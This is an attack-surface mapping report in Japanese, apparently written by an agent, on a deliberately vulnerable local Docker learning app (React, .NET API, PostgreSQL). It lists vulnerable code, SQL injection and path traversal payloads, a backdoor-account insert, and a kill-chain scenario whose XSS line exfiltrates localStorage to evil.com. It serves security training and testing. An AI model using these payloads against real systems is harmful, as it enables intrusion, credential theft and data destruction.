# アタックサーフェース定義レポート

> 実施日時: 2026-02-23 14:30:00  
> 前工程レポート: /docker-work-dir/docs/reports/01-情報収集.md  
> 分析手法: CEHアタックサーフェースマッピング（ソースコード静的解析）

---

## 1. アタックサーフェースサマリー

### 概要図

```
┌─────────────────────────────────────────────────────────────────┐
│ 外部攻撃者（ホストマシン）                                          │
│                                                                 │
│  攻撃面①: localhost:3000  (Frontend)                            │
│  攻撃面②: localhost:5000  (API)                                 │
│  攻撃面③: localhost:15432 (PostgreSQL) ← 重大リスク             │
└─────────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ Docker ネットワーク (172.26.0.0/16)                              │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ Frontend (Nginx + React SPA)                             │  │
│  │ ポート: 80                                                │  │
│  │ 攻撃面:                                                   │  │
│  │  • 5個のルート（入力フォーム多数）                         │  │
│  │  • XSS (dangerouslySetInnerHTML)                        │  │
│  │  • オープンリダイレクト (?redirect=)                       │  │
│  │  • 機密情報ハードコード (API Key, 内部URL)                │  │
│  │  • パスワードコンソール出力                                │  │
│  └──────────────────────────────────────────────────────────┘  │
│                           │                                     │
│                           ▼ HTTP (平文通信)                     │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ API (.NET 10.0 Kestrel)                                  │  │
│  │ ポート: 5000                                              │  │
│  │ 攻撃面:                                                   │  │
│  │  • 8個のエンドポイント（認証なし）                         │  │
│  │  • SQLインジェクション（全エンドポイント）                 │  │
│  │  • ディレクトリトラバーサル (/api/files/{path})           │  │
│  │  • 安全でないデシリアライズ (/api/import)                 │  │
│  │  • HTTPヘッダインジェクション                              │  │
│  │  • Mass Assignment (role昇格)                           │  │
│  │  • CORS全許可 (AllowAnyOrigin)                          │  │
│  │  • 詳細エラーメッセージ露出                                │  │
│  └──────────────────────────────────────────────────────────┘  │
│                           │                                     │
│                           ▼ PostgreSQL (SSL無効)                │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ Database (PostgreSQL 16)                                 │  │
│  │ ポート: 5432 (内部) / 15432 (外部公開) ← 重大リスク       │  │
│  │ 攻撃面:                                                   │  │
│  │  • 弱いパスワード (postgres123)                           │  │
│  │  • パスワード平文格納                                      │  │
│  │  • SSL/TLS無効                                           │  │
│  │  • 外部ネットワークから直接アクセス可能                     │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 攻撃面の統計

| カテゴリ | 項目数 | 深刻度 |
|---------|--------|--------|
| **公開ポート** | 3 (80, 5000, 15432) | 🔴 Critical |
| **APIエンドポイント** | 8 | 🟡 High |
| **入力フォーム** | 7 (検索、ログイン、CRUD×5) | 🟡 High |
| **認証不要エンドポイント** | 8 (全て) | 🔴 Critical |
| **SQLインジェクション箇所** | 6 | 🔴 Critical |
| **XSS脆弱箇所** | 1 | 🟡 High |
| **ハードコード秘匿情報** | 5 | 🟡 High |
| **パスワード平文保存** | DB全件 | 🔴 Critical |

---

## 2. ネットワーク層

### 2.1 公開ポート一覧

| ポート | サービス | プロトコル | 必要性 | リスク | 脅威 |
|--------|---------|-----------|--------|-------|------|
| **3000 → 80** | Nginx (Frontend) | HTTP | ✅ 必要 | 🟡 Medium | セキュリティヘッダ欠如、XSS |
| **5000 → 5000** | Kestrel (API) | HTTP | ✅ 必要 | 🔴 High | SQLi、認証バイパス、RCE |
| **15432 → 5432** | PostgreSQL | PostgreSQL | ❌ 不要 | 🔴 **Critical** | DB直接アクセス、データ漏洩 |

**重大な問題点:**
- **データベースポート15432が外部公開**: アプリケーション層を経由せず、データベースに直接アクセス可能
- **SSL/TLS未使用**: 全通信が平文で傍受可能
- **認証情報の弱さ**: パスワード `postgres123` は辞書攻撃で容易に突破

### 2.2 通信経路

#### 外部 → Frontend
```
ブラウザ → http://localhost:3000 → Nginx:80
  ↓
React SPA読み込み
  ↓
JavaScript実行 → 機密情報(APIキー)が埋め込まれたコードを取得
```

#### Frontend → API
```
Nginx → http://api:5000/api/* (リバースプロキシ)
  ↓
CORS: AllowAnyOrigin で全オリジンから攻撃可能
  ↓
CSRFトークンなし
```

#### API → Database
```
Kestrel → postgresql://postgres:postgres123@db:5432/vulndb?sslmode=disable
  ↓
平文通信（パケットキャプチャで認証情報・クエリが露出）
```

#### 外部 → Database（重大リスク）
```
攻撃者 → tcp://localhost:15432
  ↓
psql -h localhost -p 15432 -U postgres -d vulndb
パスワード: postgres123
  ↓
データベース全体への完全アクセス権限
```

---

## 3. アプリケーション層

### 3.1 フロントエンド攻撃面

#### 3.1.1 ルート・エンドポイント一覧

| ルート | 役割 | 入力フィールド | 脆弱性 |
|--------|------|--------------|--------|
| `/` | ユーザー一覧 | 検索フォーム | SQLi (searchパラメータ), オープンリダイレクト |
| `/users/:id` | ユーザー詳細 | - | XSS (profileImageUrl表示) |
| `/users/new` | ユーザー作成 | username, email, password, role, profileImageUrl | Mass Assignment, パスワード平文送信 |
| `/users/:id/edit` | ユーザー編集 | 同上 | 同上 |
| `/login` | ログイン | username, password | SQLi, パスワード平文送信、コンソールログ出力 |

#### 3.1.2 脆弱なコード箇所

**F-01: XSS (Stored Cross-Site Scripting)**

- **ファイル**: `/workdir/src/frontend/src/pages/UserDetail.tsx:43`
- **コード**:
```typescript
<td dangerouslySetInnerHTML={{ __html: user.profileImageUrl || '<em>未設定</em>' }} />
```
- **攻撃シナリオ**:
  1. 攻撃者が `/users/new` で `profileImageUrl` に `<script>alert(document.cookie)</script>` を設定
  2. 他のユーザーが該当ユーザーの詳細ページを閲覧
  3. スクリプトが実行され、セッション情報が窃取される

**F-02: 機密情報のハードコード**

- **ファイル**: `/workdir/src/frontend/src/config.ts:3-4`
- **コード**:
```typescript
export const INTERNAL_API_KEY = 'sk-vuln-app-secret-key-12345';
export const ADMIN_PANEL_URL = 'http://internal-admin.local:8080';
```
- **影響**: ビルド済みJavaScriptに平文で含まれるため、ブラウザの開発者ツールで簡単に閲覧可能

**F-03: オープンリダイレクト**

- **ファイル**: `/workdir/src/frontend/src/pages/UserList.tsx:12-17`
- **コード**:
```typescript
useEffect(() => {
  const params = new URLSearchParams(window.location.search);
  const redirect = params.get('redirect');
  if (redirect) {
    window.location.href = redirect; // 検証なし
  }
}, []);
```
- **攻撃URL**: `http://localhost:3000/?redirect=http://evil.com/phishing`

**F-04: CSRF対策の欠如**

- **ファイル**: `/workdir/src/frontend/src/api.ts:5`
- **コード**:
```typescript
const headers = { 'Content-Type': 'application/json' };
// CSRFトークンが含まれない
```
- **影響**: 攻撃者のサイトから被害者のブラウザを経由してAPIを呼び出し、ユーザー削除などの操作が可能

**F-05: パスワードのコンソールログ出力**

- **ファイル**: `/workdir/src/frontend/src/api.ts:55`
- **コード**:
```typescript
export async function login(username: string, password: string) {
  debugLog('login attempt', { username, password }); // パスワードが平文でログ出力
}
```
- **ファイル**: `/workdir/src/frontend/src/pages/UserCreate.tsx:22`
```typescript
console.log('Creating user with password:', form.password);
```

**F-06: localStorageに機密情報保存**

- **ファイル**: `/workdir/src/frontend/src/pages/Login.tsx:16`
- **コード**:
```typescript
localStorage.setItem('user', JSON.stringify(result.user));
// パスワードを含むユーザーオブジェクトをlocalStorageに保存
```
- **影響**: XSS経由でlocalStorageを窃取されると、全ユーザー情報（パスワード含む）が漏洩

**F-07: パスワードフィールドの不適切な設定**

- **ファイル**: `/workdir/src/frontend/src/pages/UserCreate.tsx:42`
- **コード**:
```typescript
<input name="password" type="text" value={form.password} onChange={handleChange} required style={inputStyle} />
```
- **問題**: `type="text"` のため、パスワードが画面上に平文表示される

#### 3.1.3 セキュリティヘッダの欠如

**Nginx設定** (`/workdir/src/frontend/nginx.conf`) にセキュリティヘッダの設定なし:

| ヘッダ | 現状 | 推奨値 | リスク |
|--------|------|--------|--------|
| `Content-Security-Policy` | ❌ なし | `default-src 'self'` | XSS攻撃の増幅 |
| `X-Frame-Options` | ❌ なし | `DENY` | クリックジャッキング |
| `X-Content-Type-Options` | ❌ なし | `nosniff` | MIME type sniffing攻撃 |
| `Strict-Transport-Security` | ❌ なし | `max-age=31536000` | HTTP降格攻撃 |
| `Referrer-Policy` | ❌ なし | `no-referrer` | 情報漏洩 |

---

### 3.2 WebAPI攻撃面

#### 3.2.1 エンドポイント一覧

| # | メソッド | パス | 認証 | 入力バリデーション | SQLパラメータ化 | リスク | OWASP |
|---|---------|------|------|------------------|---------------|-------|-------|
| 1 | POST | `/api/login` | ❌ なし | ❌ なし | ❌ 文字列連結 | 🔴 Critical | A03 |
| 2 | GET | `/api/users` | ❌ なし | ❌ なし | ❌ 文字列連結 | 🔴 Critical | A03 |
| 3 | GET | `/api/users/{id}` | ❌ なし | ⚠️ 部分的 | ❌ 文字列連結 | 🟡 High | A03 |
| 4 | POST | `/api/users` | ❌ なし | ❌ なし | ❌ 文字列連結 | 🔴 Critical | A03, A01 |
| 5 | PUT | `/api/users/{id}` | ❌ なし | ❌ なし | ❌ 文字列連結 | 🔴 Critical | A03, A01 |
| 6 | DELETE | `/api/users/{id}` | ❌ なし | ❌ なし | ❌ 文字列連結 | 🔴 Critical | A01 |
| 7 | GET | `/api/files/{*filePath}` | ❌ なし | ❌ なし | - | 🔴 Critical | A01 |
| 8 | POST | `/api/import` | ❌ なし | ❌ なし | - | 🔴 Critical | A08 |

#### 3.2.2 脆弱なコード箇所

**A-01: SQLインジェクション（検索機能）**

- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:37-41`
- **コード**:
```csharp
var sql = "SELECT id, username, email, password, role, profile_image_url, created_at, updated_at FROM users";
if (!string.IsNullOrEmpty(search))
{
    sql += $" WHERE username LIKE '%{search}%' OR email LIKE '%{search}%'";
}
```
- **攻撃ペイロード**: 
  - `?search=' OR '1'='1` → 全ユーザー取得
  - `?search='; DROP TABLE users; --` → テーブル削除
  - `?search=' UNION SELECT NULL,current_user,current_database(),NULL,NULL,NULL,NULL,NULL --` → DB情報取得

**A-01: SQLインジェクション（ログイン）**

- **ファイル**: `/workdir/src/api/VulnApi/Controllers/AuthController.cs:40`
- **コード**:
```csharp
var sql = $"SELECT ... FROM users WHERE username = '{request.Username}' AND password = '{request.Password}'";
```
- **攻撃ペイロード**:
  - Username: `admin' --`
  - Password: （任意）
  - → パスワードチェックをバイパスしてadminとしてログイン

**A-01: SQLインジェクション（ユーザー作成）**

- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:104-106`
- **コード**:
```csharp
var sql = $@"INSERT INTO users (username, email, password, role, profile_image_url)
             VALUES ('{user.Username}', '{user.Email}', '{user.Password}', '{user.Role}', '{user.ProfileImageUrl}')";
```
- **攻撃ペイロード**: 全フィールドでSQLiが可能

**A-02: 認証バイパス**

- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:167`
- **コード**:
```csharp
[HttpDelete("{id}")]
public async Task<IActionResult> Delete(int id)
{
    // 認証チェックなし、誰でも任意のユーザーを削除可能
}
```
- **影響**: 認証なしで `DELETE /api/users/1` でadminユーザーを削除可能

**A-03: パスワード平文保存・平文応答**

- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:200`
- **コード**:
```csharp
Password = reader.GetString(3), // パスワードをそのまま返す
```
- **影響**: `GET /api/users` で全ユーザーのパスワードが平文で取得可能

**A-04: 詳細エラー情報の露出**

- **ファイル**: `/workdir/src/api/VulnApi/Program.cs:27-28`
- **コード**:
```csharp
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage(); // スタックトレースを公開
}
```
- **影響**: 環境変数 `ASPNETCORE_ENVIRONMENT=Development` により、本番でも詳細エラーが露出

**A-05: CORS設定の不備**

- **ファイル**: `/workdir/src/api/VulnApi/Program.cs:11-18`
- **コード**:
```csharp
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.AllowAnyOrigin()    // 全オリジン許可
              .AllowAnyMethod()    // 全HTTPメソッド許可
              .AllowAnyHeader();   // 全ヘッダ許可
    });
});
```
- **影響**: 攻撃者のサイトからAPIを自由に呼び出し可能（CSRF攻撃の促進）

**A-06: Mass Assignment（権限昇格）**

- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs:96`
- **コード**:
```csharp
public async Task<IActionResult> Create([FromBody] User user)
{
    // リクエストボディのroleフィールドがそのまま受け入れられる
}
```
- **攻撃シナリオ**:
```json
POST /api/users
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "test123",
  "role": "admin"  ← 一般ユーザーが自分をadminに設定
}
```

**A-07: ディレクトリトラバーサル**

- **ファイル**: `/workdir/src/api/VulnApi/Controllers/FileController.cs:32`
- **コード**:
```csharp
var fullPath = Path.Combine("/app/uploads", filePath);
// パスの検証なし
```
- **攻撃URL**: 
  - `/api/files/../../../../etc/passwd`
  - `/api/files/../../../../app/appsettings.json`

**A-08: HTTPヘッダインジェクション**

- **ファイル**: `/workdir/src/api/VulnApi/Controllers/AuthController.cs:59-60`
- **コード**:
```csharp
Response.Headers.Append("X-User-Role", user.Role);
Response.Headers.Append("X-Username", user.Username);
```
- **攻撃ペイロード**: Username に `admin\r\nX-Custom: injected` を設定

**A-10: 安全でないデシリアライズ (RCE)**

- **ファイル**: `/workdir/src/api/VulnApi/Controllers/FileController.cs:56-58`
- **コード**:
```csharp
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All  // RCE脆弱性
};
var result = JsonConvert.DeserializeObject(json, settings);
```
- **影響**: 任意のコード実行が可能（Ysoserial.netでペイロード生成可能）

---

### 3.3 データベース攻撃面

#### 3.3.1 テーブル構造

**usersテーブル** (`/workdir/src/db/init.sql`)

| カラム | 型 | Nullable | デフォルト | 脆弱性 |
|--------|-----|---------|-----------|--------|
| `id` | SERIAL | NOT NULL | auto | - |
| `username` | VARCHAR(100) | NOT NULL | - | - |
| `email` | VARCHAR(255) | NULL | - | NULL許可 |
| `password` | VARCHAR(255) | NOT NULL | - | ⚠️ **平文保存** |
| `role` | VARCHAR(50) | NULL | 'user' | Mass Assignment対象 |
| `profile_image_url` | TEXT | NULL | '' | XSS格納先 |
| `created_at` | TIMESTAMP | NULL | NOW() | - |
| `updated_at` | TIMESTAMP | NULL | NOW() | - |

**重大な問題点:**
1. パスワードが平文で格納される（ハッシュ化なし）
2. 一意制約（UNIQUE）がない → 同一usernameで複数アカウント作成可能
3. role列にENUM制約がない → 任意の文字列を設定可能

#### 3.3.2 初期データ

**ファイル**: `/workdir/src/db/seed.sql`

```sql
INSERT INTO users (username, email, password, role, profile_image_url) VALUES
('admin', 'admin@example.com', 'admin123', 'admin', ''),
('tanaka', 'tanaka@example.com', 'password', 'user', ''),
('suzuki', 'suzuki@example.com', '123456', 'user', ''),
('sato', 'sato@example.com', 'qwerty', 'user', ''),
('yamada', 'yamada@example.com', 'letmein', 'user', '');
```

**脆弱性:**
- 全パスワードが弱い（辞書攻撃で即座に突破可能）
- adminパスワードが `admin123`（最もよく使われる脆弱パスワード）

#### 3.3.3 接続設定

**ファイル**: `/workdir/docker-compose.yml:41`

```yaml
ConnectionStrings__DefaultConnection: "Host=db;Port=5432;Database=vulndb;Username=postgres;Password=postgres123;SSL Mode=Disable"
```

**脆弱性:**
- D-01: 弱いパスワード `postgres123`
- D-03: SSL/TLS無効 → 平文通信
- I-02: 環境変数にハードコード

#### 3.3.4 外部公開設定

**ファイル**: `/workdir/docker-compose.yml:21-22`

```yaml
ports:
  - "15432:5432"  # 脆弱性 I-03: DBポートが外部公開
```

**攻撃シナリオ:**
```bash
# 攻撃者のマシンから直接接続
psql -h localhost -p 15432 -U postgres -d vulndb
# パスワード: postgres123

# 全データ取得
SELECT * FROM users;

# パスワード変更
UPDATE users SET password='hacked', role='admin' WHERE username='admin';

# データ削除
DELETE FROM users WHERE role='user';
```

---

## 4. インフラ層

### 4.1 Docker設定の脆弱性

**ファイル**: `/workdir/docker-compose.yml`

| 脆弱性ID | 項目 | 問題点 | 影響 |
|---------|------|--------|------|
| I-01 | コンテナ実行ユーザー | rootで実行（user指定なし） | コンテナ脱出時の影響拡大 |
| I-02 | 環境変数 | パスワード・接続文字列をハードコード | Git履歴に機密情報が残る |
| I-03 | ポート公開 | DBポート15432を外部公開 | データベース直接攻撃 |
| I-04 | ネットワーク分離 | デフォルトブリッジネットワーク | サービス間の通信制限なし |

### 4.2 ボリュームマウント

```yaml
volumes:
  - pgdata:/var/lib/postgresql/data
  - ./src/db/init.sql:/docker-entrypoint-initdb.d/01-init.sql
  - ./src/db/seed.sql:/docker-entrypoint-initdb.d/02-seed.sql
```

**観察事項:**
- ホスト上のSQLファイルをコンテナにマウント
- ボリューム `pgdata` はDocker管理領域に保存
- 読み取り専用マウント（`:ro`）の指定なし

### 4.3 ヘルスチェック設定

全サービスにヘルスチェックが設定されているが、セキュリティには影響しない（可用性のみ）。

---

## 5. OWASP Top 10 (2021) マッピング

| # | カテゴリ | 対象箇所 | 深刻度 | 具体的な脆弱性 |
|---|---------|---------|--------|--------------|
| **A01** | Broken Access Control | `DELETE /api/users/{id}`<br>`POST /api/users` (role設定) | 🔴 Critical | • 認証なしで任意のユーザー削除可能<br>• Mass Assignmentで一般ユーザーがadminに昇格 |
| **A02** | Cryptographic Failures | • データベースパスワード列<br>• API応答<br>• localStorageの保存内容 | 🔴 Critical | • パスワード平文保存<br>• SSL/TLS未使用<br>• localStorage に機密情報保存 |
| **A03** | Injection | • `/api/users?search=`<br>• `/api/login`<br>• `/api/users` (POST/PUT) | 🔴 Critical | • 全6箇所でSQLインジェクション<br>• 文字列連結でSQL構築<br>• パラメータ化クエリ未使用 |
| **A04** | Insecure Design | • エラーハンドリング<br>• CORS設定<br>• 認証機構の欠如 | 🟡 High | • スタックトレース露出<br>• AllowAnyOrigin<br>• セッション管理なし |
| **A05** | Security Misconfiguration | • Nginx設定<br>• ASPNETCORE_ENVIRONMENT<br>• DBポート公開 | 🟡 High | • セキュリティヘッダ未設定<br>• 開発モードで運用<br>• 不要なポート公開 |
| **A06** | Vulnerable and Outdated Components | • .NET 10.0 preview<br>• Newtonsoft.Json 13.0.3 | 🟡 Medium | • プレビュー版使用<br>• デシリアライズ脆弱性あり |
| **A07** | Identification and Authentication Failures | • 全APIエンドポイント<br>• ログイン機能 | 🔴 Critical | • 認証機構なし<br>• レート制限なし<br>• セッション管理なし |
| **A08** | Software and Data Integrity Failures | • `/api/import`<br>• HTTPヘッダ | 🔴 Critical | • TypeNameHandling.All (RCE)<br>• ヘッダインジェクション |
| **A09** | Security Logging and Monitoring Failures | • API全体<br>• Frontend | 🟢 Medium | • ログ機構なし<br>• コンソールにパスワード出力 |
| **A10** | Server-Side Request Forgery (SSRF) | `/api/files/{*filePath}` | 🔴 Critical | • ディレクトリトラバーサル<br>• パス検証なし |

---

## 6. 優先度付き攻撃面一覧

### 6.1 Critical（即座に悪用可能）

| 優先度 | 攻撃面 | カテゴリ | 推定リスク | 検証方法 | CVSS |
|-------|--------|---------|-----------|---------|------|
| **P0-01** | データベース外部公開 | インフラ | データ全体の漏洩・改ざん・削除 | `psql -h localhost -p 15432 -U postgres` | 10.0 |
| **P0-02** | SQLインジェクション（ログイン） | A03 | 認証バイパス、DB全体掌握 | `Username: admin' --` | 9.8 |
| **P0-03** | SQLインジェクション（検索） | A03 | データ漏洩、DB改ざん | `?search=' OR '1'='1` | 9.8 |
| **P0-04** | 認証バイパス（削除API） | A01, A07 | 任意のユーザー削除 | `DELETE /api/users/1` (認証なし) | 9.1 |
| **P0-05** | 安全でないデシリアライズ | A08 | リモートコード実行 | `/api/import` にペイロード送信 | 9.8 |
| **P0-06** | Mass Assignment | A01 | 権限昇格（一般→admin） | `POST /api/users` で `role: "admin"` | 8.8 |

### 6.2 High（攻撃スキル中程度で悪用可能）

| 優先度 | 攻撃面 | カテゴリ | 推定リスク | 検証方法 | CVSS |
|-------|--------|---------|-----------|---------|------|
| **P1-01** | ディレクトリトラバーサル | A10 | システムファイル読み取り | `/api/files/../../../../etc/passwd` | 7.5 |
| **P1-02** | Stored XSS | F-01 | セッション乗っ取り | profileImageUrl に `<script>` 挿入 | 7.1 |
| **P1-03** | パスワード平文保存 | A02 | 全ユーザーのパスワード漏洩 | `GET /api/users` でパスワード取得 | 8.2 |
| **P1-04** | CORS全許可 | A04 | CSRF攻撃 | 外部サイトからAPIを呼び出し | 6.5 |
| **P1-05** | HTTPヘッダインジェクション | A08 | レスポンス分割攻撃 | Username に改行コード挿入 | 6.1 |

### 6.3 Medium（情報漏洩・機密性の問題）

| 優先度 | 攻撃面 | カテゴリ | 推定リスク | 検証方法 | CVSS |
|-------|--------|---------|-----------|---------|------|
| **P2-01** | オープンリダイレクト | F-03 | フィッシング攻撃 | `/?redirect=http://evil.com` | 5.4 |
| **P2-02** | 機密情報ハードコード | F-02 | 内部情報露出 | ビルド済みJSを解析 | 5.3 |
| **P2-03** | 詳細エラー情報露出 | A04 | 内部構造の暴露 | 意図的にエラーを発生させる | 5.3 |
| **P2-04** | パスワードコンソール出力 | F-05 | ログファイルから漏洩 | ブラウザ開発者ツールで確認 | 4.3 |
| **P2-05** | セキュリティヘッダ欠如 | A05 | XSS・クリックジャッキング | レスポンスヘッダを確認 | 4.3 |

---

## 7. 攻撃シナリオ（Kill Chain）

### シナリオ1: 外部攻撃者によるDB完全掌握

```
1. 偵察（Reconnaissance）
   └→ nmap localhost で15432ポートを発見

2. 武器化（Weaponization）
   └→ 辞書ファイル（rockyou.txt）を準備

3. 配送（Delivery）
   └→ psql -h localhost -p 15432 -U postgres で接続試行

4. 搾取（Exploitation）
   └→ パスワード postgres123 で認証成功

5. インストール（Installation）
   └→ 管理者権限で永続化用のバックドアアカウントを作成
      INSERT INTO users VALUES (9999, 'backdoor', 'backdoor@evil.com', 'superpass', 'admin', '', NOW(), NOW())

6. 指令制御（Command and Control）
   └→ 定期的にデータを窃取

7. 目的実行（Actions on Objectives）
   └→ 全ユーザーデータをダウンロード
   └→ データベースを暗号化してランサムウェア攻撃
```

### シナリオ2: SQLインジェクションからの権限昇格

```
1. 偵察
   └→ /api/users?search=test で検索機能を発見

2. 武器化
   └→ SQLiペイロードを準備

3. 配送・搾取
   └→ /api/users?search=' OR '1'='1 で全ユーザー情報（パスワード含む）を取得

4. インストール
   └→ 取得したadminパスワード admin123 を使用してログイン

5. 権限昇格
   └→ POST /api/users で自身をadminに昇格
      { "username": "attacker", "role": "admin", "password": "evil123" }

6. 目的実行
   └→ DELETE /api/users/{id} で他の全ユーザーを削除
```

### シナリオ3: XSS + CSRF による横展開

```
1. Stored XSSペイロード作成
   └→ profileImageUrl に以下を設定:
      <script>fetch('/api/users/1',{method:'DELETE'})</script>

2. ユーザーが詳細ページを閲覧
   └→ スクリプトが実行され、ユーザー1が削除される

3. セッション窃取
   └→ <script>fetch('http://evil.com?c='+localStorage.user)</script>
   └→ 攻撃者のサーバーにユーザー情報（パスワード含む）が送信される
```

---

## 8. 推奨される次フェーズのアクション

### 8.1 脆弱性検証（Exploitation）フェーズ

以下の優先度で実証実験を実施:

1. **P0-01**: データベース直接接続テスト
2. **P0-02**: SQLインジェクション（認証バイパス）
3. **P0-03**: SQLインジェクション（データ抽出）
4. **P0-04**: 認証なし削除API
5. **P0-05**: 安全でないデシリアライズ（RCE）
6. **P0-06**: Mass Assignment（権限昇格）

### 8.2 自動スキャンツール実行

- **sqlmap**: SQLインジェクションの自動検出・悪用
- **OWASP ZAP**: パッシブ/アクティブスキャン
- **Nikto**: Webサーバー脆弱性スキャン
- **Nmap**: ポートスキャン・バージョン検出
- **Trivy**: コンテナイメージ脆弱性スキャン

### 8.3 手動ペネトレーションテスト

- ディレクトリトラバーサルの深度テスト
- XSSペイロードのバリエーション検証
- CSRF攻撃の実証
- レート制限なしブルートフォース

---

## 9. 統計サマリー

### 9.1 脆弱性分布（重大度別）

```
Critical:  12件 ████████████ 54.5%
High:       6件 ██████       27.3%
Medium:     4件 ████         18.2%
Low:        0件              0%
─────────────────────────────────
合計:      22件
```

### 9.2 OWASP Top 10 カバレッジ

```
A01 (Access Control):          2件 ██
A02 (Cryptographic):           3件 ███
A03 (Injection):               6件 ██████
A04 (Insecure Design):         3件 ███
A05 (Misconfiguration):        3件 ███
A06 (Vulnerable Components):   1件 █
A07 (Auth Failures):           2件 ██
A08 (Integrity Failures):      2件 ██
A09 (Logging Failures):        1件 █
A10 (SSRF):                    1件 █
```

### 9.3 攻撃面の分布

```
ネットワーク層:    3箇所  (ポート公開)
API層:            8箇所  (エンドポイント)
フロントエンド層:  7箇所  (入力フォーム・ページ)
データベース層:    4箇所  (設定・構造)
インフラ層:        4箇所  (Docker設定)
```

---

## 10. 結論

### 主要な発見事項

本アタックサーフェース分析により、対象アプリケーションは以下の特徴を持つことが判明しました:

1. **包括的な脆弱性の宝庫**: OWASP Top 10 の全カテゴリをカバー
2. **Critical脆弱性が過半数**: 22件中12件が即座に悪用可能
3. **多層防御の完全欠如**: ネットワーク・アプリケーション・データの全層で防御なし
4. **教育目的の設計**: 意図的に脆弱性を組み込んだ学習用環境

### 最も深刻な問題点（Top 3）

| 順位 | 脆弱性 | 影響 | 悪用難易度 |
|-----|--------|------|----------|
| 🥇 | **データベースポート外部公開** | データ全体の掌握 | ⭐ (極めて容易) |
| 🥈 | **SQLインジェクション（認証バイパス）** | 管理者権限奪取 | ⭐ (極めて容易) |
| 🥉 | **パスワード平文保存・応答** | 全ユーザー認証情報漏洩 | ⭐ (極めて容易) |

### 次フェーズへの推奨事項

次の「脆弱性検証（Exploitation）」フェーズでは、以下を実施すべきです:

1. **P0脆弱性の実証**: 6つのCritical脆弱性の実際の悪用
2. **自動スキャンツールの実行**: sqlmap, ZAP, Nikto による網羅的検証
3. **攻撃シナリオの実演**: Kill Chainに基づく複合攻撃の実証
4. **修正案の提示**: 各脆弱性に対する具体的な対策コード

---

**レポート作成者**: アタックサーフェース定義エージェント (Attack Surface Mapping)  
**分析対象**: ローカルDocker環境内の脆弱性学習用アプリケーション  
**分析手法**: CEH手法に基づく静的ソースコード分析  
**外部スキャン**: なし（ローカルファイル分析のみ）
